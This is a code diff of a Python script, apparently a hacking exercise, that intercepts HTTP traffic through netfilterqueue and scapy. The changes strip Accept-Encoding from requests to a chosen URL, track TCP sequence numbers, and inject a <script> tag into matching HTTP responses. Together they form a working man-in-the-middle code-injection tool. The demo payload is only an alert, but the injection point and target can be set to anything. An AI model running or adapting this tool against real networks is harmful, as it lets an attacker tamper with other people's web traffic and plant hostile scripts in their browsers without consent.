@@ -7,10 +7,12 @@ from netfilterqueue import NetfilterQueue
 import argparse
 import subprocess
 import re
+import logging
 import scapy.all as scapy
 
 
-ack_list = []
+ack_list_request = []
+ack_list_response = []
 
 
 def set_load(packet, load):
@@ -25,13 +27,23 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):  # DNS response
         if scapy_packet[scapy.TCP].dport == 80:
-            print("[+] HTTP Request")
-            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load.decode())
-            new_packet = set_load(scapy_packet, modified_load)
-            packet.set_payload(bytes(new_packet))
+            if url_target.encode() in scapy_packet[scapy.Raw].load:
+                print("[+] HTTP Request")
+                ack_list_request.append(scapy_packet[scapy.TCP].ack)
+                modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load.decode())
+                new_packet = set_load(scapy_packet, modified_load)
+                packet.set_payload(bytes(new_packet))
         elif scapy_packet[scapy.TCP].sport == 80:
-            print("[+] HTTP Response")
-            print(scapy_packet.show())
+            if scapy_packet[scapy.TCP].seq in ack_list_request:
+                ack_list_response.append(scapy_packet[scapy.TCP].ack)
+            elif scapy_packet[scapy.TCP].ack in ack_list_response:
+                if inject_in.encode() in scapy_packet[scapy.Raw].load:
+                    print("[+] HTTP Response")
+                    modified_load = scapy_packet[scapy.Raw]\
+                        .load.decode()\
+                        .replace(inject_in, inject_in + "<script>alert('Hello hacking world');</script>")
+                    new_packet = set_load(scapy_packet, modified_load)
+                    packet.set_payload(bytes(new_packet))
 
     # print(scapy_packet.show())  # Return the packet's payload as a byte object to see the packets.
     packet.accept()  # If it is accepted, it will be forwarded.
@@ -65,13 +77,14 @@ def chain_setting(chain_iptables_to_set, remove):
 
 
 arguments = argparse.ArgumentParser(description="Intercepting file - HTTP only")
-# arguments.add_argument('-f', '--file-type', dest='file_type', help='String which is the type of the file.')
 arguments.add_argument('-c', '--iptables-chain', dest='chain_iptables', help='IPTABLES as forward or localhost')
-# arguments.add_argument('-url', '--url-file', dest='url_file', help='The url to swap the file requested for the other')
+arguments.add_argument('-url', '--url-target', dest='url_target', help='The url target')
+arguments.add_argument('-inj', '--inject-in', dest='inject_in', help='Place to inject the code. Be careful, it must '
+                                                                     'be a unique place. The arg must be between \'')
 
-# file_type = arguments.parse_args().file_type
 chain_iptables = arguments.parse_args().chain_iptables
-# url_file = arguments.parse_args().url_file
+url_target = arguments.parse_args().url_target
+inject_in = arguments.parse_args().inject_in
 
 
 netQueue = NetfilterQueue()
@@ -81,8 +94,9 @@ try:
     netQueue.run()
 except KeyboardInterrupt:
     chain_setting(chain_iptables, True)
-except BaseException as be:
-    print("\r[-] " + be.__str__() + " error has come up ... quiting", end='\n\n')
+except BaseException as e:
+    logging.exception(e)
+    print("\nError has come up ... quiting", end='\n\n')
     chain_setting(chain_iptables, True)
 
 
